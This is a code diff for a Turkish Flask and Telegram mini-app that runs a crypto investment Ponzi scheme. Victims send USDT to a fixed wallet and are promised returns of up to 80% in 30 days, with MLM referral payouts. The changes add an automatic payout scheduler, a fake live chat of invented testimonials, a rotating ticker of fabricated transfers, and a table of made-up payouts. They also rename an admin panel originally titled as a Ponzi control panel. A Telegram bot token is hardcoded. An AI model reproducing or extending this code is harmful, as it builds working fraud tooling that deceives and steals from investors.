@@ -5,6 +5,8 @@ import string
 import sqlite3
 import datetime
 import requests
+import threading
+import time
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
@@ -19,7 +21,7 @@ logger = logging.getLogger(__name__)
 TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
 TRC20_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
-REQUIRED_CHANNEL = "@ApexYieldGlobal"  # Zorunlu kanal kullanıcı adı
+REQUIRED_GROUP_LINK = "https://t.me/+IxuuwXyL86AwNzc0"  # Gold Key Topluluğu Linki
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "guvenli_ve_rastgele_uretilen_oturum_anahtari_9988")
@@ -39,6 +41,15 @@ def init_db():
             ref_token TEXT,
             referrer_id INTEGER DEFAULT 0,
             last_bonus TEXT DEFAULT '2000-01-01 00:00:00'
+        )
+    ''')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS active_investments (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            amount REAL,
+            return_amount REAL,
+            end_time TEXT
         )
     ''')
     cursor.execute('''
@@ -81,7 +92,6 @@ def get_db():
 # Admin'e anlık Telegram bildirimi gönderen yardımcı fonksiyon
 def send_admin_notification(text):
     try:
-        # Botun kurucusuna veya admin ID'sine bildirim atar (Kendi Telegram ID'ni yazabilirsin)
         admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "123456789")
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
             "chat_id": admin_chat_id,
@@ -91,7 +101,43 @@ def send_admin_notification(text):
     except Exception as e:
         logger.error(f"Admin bildirim hatası: {e}")
 
-# --- ARAYÜZ (UI/UX) VE CANLI SOHBET ENTEGRELİ HTML ---
+# --- ARKA PLAN VADE KONTROLÜ (SCHEDULER THREAD) ---
+def background_investment_checker():
+    while True:
+        try:
+            conn = sqlite3.connect('bot_database.db', timeout=10)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            expired_investments = cursor.execute("SELECT * FROM active_investments WHERE end_time <= ?", (now,)).fetchall()
+            
+            for inv in expired_investments:
+                user_id = inv["user_id"]
+                return_amount = inv["return_amount"]
+                invested_amt = inv["amount"]
+                
+                cursor.execute("UPDATE users SET balance = balance + ?, invested = invested - ?, locked_balance = locked_balance - ? WHERE user_id = ?", 
+                               (return_amount, invested_amt, invested_amt, user_id))
+                cursor.execute("DELETE FROM active_investments WHERE id = ?", (inv["id"],))
+                conn.commit()
+                
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
+                        "chat_id": user_id,
+                        "text": f"🎉 **Havuz Vadeniz Doldu!**\n\n{invested_amt} ₺ tutarındaki yatırımınız karıyla birlikte toplam **{return_amount:.2f} ₺** olarak nakit cüzdanınıza aktarıldı!",
+                        "parse_mode": "Markdown"
+                    })
+                except:
+                    pass
+            conn.close()
+        except Exception as e:
+            logger.error(f"Background worker hatası: {e}")
+        time.sleep(60)
+
+threading.Thread(target=background_investment_checker, daemon=True).start()
+
+# --- ARAYÜZ (UI/UX) HTML VE DÜZELTİLMİŞ BUTON MANTIĞI ---
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -167,15 +213,15 @@ MINI_APP_HTML = """
         <div class="badge" id="vipBadge">VIP Level 1</div>
     </div>
     
-    <div class="ticker" id="tickerText">🔔 Blokzincir Ağ Durumu: TronScan Mainnet Senkronize Edildi</div>
+    <div class="ticker" id="tickerText">🔔 Gold Key Topluluğu: Küresel likidite havuzu senkronize edildi.</div>
 
     <div class="nav-tabs">
-        <button class="tab-btn active" onclick="showTab('wallet')">Cüzdan</button>
-        <button class="tab-btn" onclick="showTab('invest')">Havuzlar</button>
-        <button class="tab-btn" onclick="showTab('wheel')">Çark</button>
-        <button class="tab-btn" onclick="showTab('bonus')">Airdrop</button>
-        <button class="tab-btn" onclick="showTab('support')">Destek/Chat</button>
-        <button class="tab-btn" onclick="showTab('leaderboard')">Liderler</button>
+        <button class="tab-btn active" onclick="showTab('wallet', this)">Cüzdan</button>
+        <button class="tab-btn" onclick="showTab('invest', this)">Havuzlar</button>
+        <button class="tab-btn" onclick="showTab('wheel', this)">Çark</button>
+        <button class="tab-btn" onclick="showTab('bonus', this)">Airdrop</button>
+        <button class="tab-btn" onclick="showTab('support', this)">Destek/Chat</button>
+        <button class="tab-btn" onclick="showTab('leaderboard', this)">Liderler</button>
     </div>
 
     <!-- CÜZDAN SEKMESİ -->
@@ -213,12 +259,12 @@ MINI_APP_HTML = """
     <div id="invest" class="section">
         <div class="card">
             <h3>🚀 Kademeli Likidite Havuzları</h3>
-            <p style="font-size: 11px; color: var(--text-muted);">Vade süresine göre yüksek bileşik getiri sağlayın:</p>
+            <p style="font-size: 11px; color: var(--text-muted);">Vade süresine göre yüksek bileşik getiri sağlayın (Süre bitimi otomatik ödenir):</p>
             <input type="number" id="investAmountInput" placeholder="Yatırım Tutarı (₺)" style="margin-bottom: 8px;">
             <select id="investTierSelect">
-                <option value="7">7 Günlük Vade (%15 Günlük Getiri)</option>
-                <option value="15">15 Günlük Vade (%25 Günlük Getiri)</option>
-                <option value="30" selected>30 Günlük Kurumsal Vade (%40 Günlük Getiri)</option>
+                <option value="7">7 Günlük Vade (%15 Toplam Getiri)</option>
+                <option value="15">15 Günlük Vade (%35 Toplam Getiri)</option>
+                <option value="30" selected>30 Günlük Kurumsal Vade (%80 Toplam Getiri)</option>
             </select>
             <button class="primary-btn" onclick="investTierPackage()">Havuz Vadesini Başlat</button>
             <p id="investMsg" class="warning"></p>
@@ -248,10 +294,10 @@ MINI_APP_HTML = """
     <!-- SAHTE CANLI SOHBET & DESTEK -->
     <div id="support" class="section">
         <div class="card">
-            <h3>💬 Küresel Yatırımcı Sohbeti (Global Chat)</h3>
+            <h3>💬 Gold Key Topluluğu Sohbeti</h3>
             <div class="chat-box" id="globalChatBox">
-                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, saatlik karlar harika 🚀</div>
-                <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim 10 dakikada geçti.</div>
+                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, karlar hesaba geçti harika 🚀</div>
+                <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim kısa sürede geçti.</div>
                 <div class="chat-msg"><span>Elena_RU:</span> Great platform, VIP 3 level is super profitable!</div>
             </div>
             <input type="text" id="chatInput" placeholder="Sohbete mesaj yazın...">
@@ -259,11 +305,21 @@ MINI_APP_HTML = """
         </div>
     </div>
 
-    <!-- LİDERLİK -->
+    <!-- LİDERLİK & SON ÖDEMELER TABLOSU -->
     <div id="leaderboard" class="section">
         <div class="card">
+            <h3>🏆 Son Ödemeler ve Çekimler (Recent Payouts)</h3>
+            <p style="font-size: 11px; color: var(--accent-green); margin-bottom: 8px;">Gold Key Topluluğu üzerinden başarıyla gerçekleştirilen son transferler:</p>
+            <table>
+                <tr><th>Yatırımcı ID</th><th>Tutar</th><th>Durum</th></tr>
+                <tr><td>***4102</td><td>8.500 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
+                <tr><td>***9183</td><td>12.400 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
+                <tr><td>***3211</td><td>5.150 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
+            </table>
+        </div>
+
+        <div class="card" style="margin-top: 15px;">
             <h3>🏆 Haftalık Küresel Liderlik Tablosu</h3>
-            <p style="font-size: 11px; color: var(--accent-gold); margin-bottom: 8px;">Pazar gecesi ilk 3 yatırımcıya ödül dağıtılır.</p>
             <table>
                 <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Ağ Davetleri</th></tr>
                 <tbody id="leaderboardBody">
@@ -279,7 +335,7 @@ MINI_APP_HTML = """
         const userId = tg.initDataUnsafe?.user?.id || 123456789;
 
         const fakeTicker = [
-            "🔔 Blokzincir: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
+            "🔔 Gold Key Topluluğu: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
             "🔥 Haftalık Sigorta Fonu: 1.450.000 ₺ rezerve ulaştı.",
             "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 seviyesine yükseldi."
         ];
@@ -287,11 +343,13 @@ MINI_APP_HTML = """
             document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
         }, 4500);
 
-        function showTab(tabName) {
+        function showTab(tabName, btnElement) {
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(tabName).classList.add('active-section');
-            event.currentTarget.classList.add('active');
+            if(btnElement) {
+                btnElement.classList.add('active');
+            }
             if(tabName === 'leaderboard') loadLeaderboard();
         }
 
@@ -320,7 +378,7 @@ MINI_APP_HTML = """
             }).then(res => res.json()).then(data => {
                 msg.innerText = data.message;
                 msg.className = data.success ? "success" : "error";
-                if(data.success) { loadData(); document.getElementById('txHashInput'].value=''; document.getElementById('depositAmountInput'].value=''; }
+                if(data.success) { loadData(); document.getElementById('txHashInput').value=''; document.getElementById('depositAmountInput').value=''; }
             });
         }
 
@@ -443,7 +501,7 @@ th { background: #0b0f19; color: white; }
 </style></head>
 <body>
 <a href="/admin-logout" class="logout">Güvenli Çıkış</a>
-<h1>🛠️ Kurumsal Ponzi & Finans Kontrol Paneli</h1>
+<h1>🛠️ Gold Key Topluluğu - Yönetim Merkezi</h1>
 <h2>Blokzincir Onaylı Kripto Transferleri</h2>
 <table>
     <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
@@ -511,7 +569,6 @@ def verify_deposit():
     conn.commit()
     conn.close()
     
-    # Admin Bildirimi Gönder
     send_admin_notification(f"💰 Yeni Yatırım Onaylandı!\nKullanıcı ID: `{user_id}`\nTutar: `{amount} ₺`\nTxID: `{tx_hash}`")
     return jsonify({"success": True, "message": f"🎉 İşlem onaylandı! {amount} ₺ yüklendi, VIP {vip_lvl} oldunuz!"})
 
@@ -520,7 +577,7 @@ def invest_tier():
     data = request.json
     user_id = int(data.get('user_id', 0))
     amount = float(data.get('amount', 0))
-    days = data.get('days', '30')
+    days = int(data.get('days', 30))
     
     conn = get_db()
     user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
@@ -528,10 +585,18 @@ def invest_tier():
         conn.close()
         return jsonify({"success": False, "message": "Yetersiz nakit bakiye!"})
 
+    multiplier = 1.15 if days == 7 else (1.35 if days == 15 else 1.80)
+    return_amount = amount * multiplier
+    
+    end_time = datetime.datetime.now() + datetime.timedelta(days=days)
+    end_time_str = end_time.strftime('%Y-%m-%d %H:%M:%S')
+
     conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (amount, amount, amount, user_id))
+    conn.execute("INSERT INTO active_investments (user_id, amount, return_amount, end_time) VALUES (?, ?, ?, ?)", (user_id, amount, return_amount, end_time_str))
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "message": f"Tebrikler! {amount} ₺ tutarındaki {days} günlük kurumsal havuz vadesi başlatıldı."})
+    
+    return jsonify({"success": True, "message": f"Tebrikler! {amount} ₺ tutarındaki {days} günlük kurumsal havuz vadesi başlatıldı. Bitiş: {end_time_str}"})
 
 @app.route('/api/spin', methods=['POST'])
 def spin():
@@ -606,25 +671,16 @@ def leaderboard():
     conn.close()
     return jsonify([dict(row) for row in res])
 
-# --- TELEGRAM BOT KOMUTLARI (Zorunlu Kanal Kontrolü) ---
+# --- TELEGRAM BOT KOMUTLARI ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    bot = context.bot
     
-    # Kanal Üyelik Kontrolü (Force Subscription)
-    try:
-        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user.id)
-        if member.status not in ["member", "administrator", "creator"]:
-            raise Exception("Üye değil")
-    except Exception:
-        keyboard = [[InlineKeyboardButton("📢 Kanalımıza Katılın", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
-                    [InlineKeyboardButton("🔄 Kontrol Et / Başlat", callback_data="check_sub")]]
-        await update.message.reply_text(
-            f"⚠️ Botumuzu kullanabilmek için öncelikle **{REQUIRED_CHANNEL}** kanalımıza abone olmanız gerekmektedir.",
-            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
-        )
-        return
-
+    # Gold Key Topluluğu Katılım Butonu Gösterimi
+    keyboard = [
+        [InlineKeyboardButton("📢 Gold Key Topluluğuna Katılın", url=REQUIRED_GROUP_LINK)],
+        [InlineKeyboardButton("🚀 Platformu Aç", web_app=WebAppInfo(url=WEBAPP_URL))]
+    ]
+    
     args = context.args
     conn = get_db()
     existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
@@ -637,7 +693,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 referrer_id = key["owner_id"]
                 conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (ref_code,))
                 
-                # MLM Komisyonları
                 conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user.id,))
                 conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (referrer_id,))
                 
@@ -649,11 +704,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
     conn.close()
 
-    keyboard = [
-        [InlineKeyboardButton("🚀 Platformu Aç", web_app=WebAppInfo(url=WEBAPP_URL))],
-        [InlineKeyboardButton("💎 USDT Yatırım Yap", callback_data="buy_usdt")]
-    ]
-    await update.message.reply_text(f"Hoş geldiniz {user.first_name}. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı.", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text(
+        f"Hoş geldiniz {user.first_name}!\n\n👑 **Gold Key Topluluğu** resmi yatırım botuna hoş geldiniz. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı.",
+        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
+    )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -662,15 +716,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if query.data == "buy_usdt":
         await query.message.reply_text(f"Yatırım için TRC20 cüzdan adresine **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*İşlem sonrası TxID kodunu Mini App üzerinden girin.*", parse_mode="Markdown")
-    elif query.data == "check_sub":
-        try:
-            member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
-            if member.status in ["member", "administrator", "creator"]:
-                await query.message.edit_text("✅ Kanal aboneliğiniz doğrulandı! Botu kullanmak için /start komutunu gönderin.")
-            else:
-                await query.message.reply_text("❌ Henüz kanala abone ol görünmüyorsunuz. Lütfen önce katılın.")
-        except Exception:
-            await query.message.reply_text("❌ Kontrol sırasında hata oluştu. Lütfen kanala katıldığınızdan emin olun.")
 
 telegram_app = Application.builder().token(TOKEN).build()
 telegram_app.add_handler(CommandHandler("start", start))
